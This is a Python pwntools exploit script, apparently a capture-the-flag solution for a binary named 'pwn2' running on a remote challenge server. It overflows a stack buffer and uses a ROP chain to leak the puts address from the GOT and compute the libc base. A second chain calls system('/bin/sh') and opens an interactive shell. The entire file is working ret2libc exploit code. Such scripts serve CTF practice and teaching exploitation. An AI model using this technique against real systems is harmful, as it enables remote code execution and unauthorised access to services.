from pwn import *

context(arch="amd64", os="linux", log_level="info")
context.gdb_binary = "/bin/pwndbg"

# io = process("./pwn2")
io = remote("node5.anna.nssctf.cn", 29186)
elf = ELF("./pwn2")
libc = ELF("./libc6_2.27-0ubuntu3_amd64.so")
# libc = ELF("/usr/lib/libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = 0x400B28
ret_addr = 0x4006B9
pop_rdi_addr = 0x400C83
encrypt_addr = 0x4009A0

io.recvuntil(b"choice!\n")
io.sendline(b"1")

payload = (
    b"a" * (0x50 + 0x8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(encrypt_addr)
)
io.recvuntil(b"encrypted")
io.sendline(payload)


puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("puts address: ", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address: ", hex(libc_base))
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print("bin sh address: ", hex(binsh_addr))
system_addr = libc_base + libc.sym["system"]
print("system address: ", hex(system_addr))


payload = (
    b"a" * (0x50 + 0x8)
    + p64(ret_addr)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(binsh_addr)
    + p64(system_addr)
)

io.recvuntil(b"encrypted")
io.sendline(payload)
io.interactive()
